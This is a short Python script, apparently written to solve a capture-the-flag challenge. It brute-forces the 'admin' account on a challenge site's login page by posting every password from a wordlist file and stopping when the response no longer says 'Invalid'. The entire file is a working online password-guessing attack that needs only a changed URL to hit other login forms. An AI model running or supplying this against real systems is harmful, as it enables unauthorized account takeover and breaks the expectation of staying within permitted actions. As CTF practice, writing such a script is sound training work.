import requests
 
url = 'http://chall.cbctf.xyz:34050/login'  # Replace with the actual URL

# Set the username
username = 'admin'

# Load passwords from a file
with open('ss.txt', 'r') as f:
    passwords = f.read().splitlines()

# Loop through the passwords and attempt login
for password in passwords:
    # Create a dictionary with the login data
    data = {
        'username': username,
        'password': password
    }

    # Send a POST request to the login URL
    response = requests.post(url, data=data)
    # print(response.text)
    

    # Check the response
    if 'Invalid' not in response.text:  # Adjust this condition based on the actual response
        print(f'Success! Password found: {password}')
        break
    else:
        print(f'Tried password: {password} - Failed')
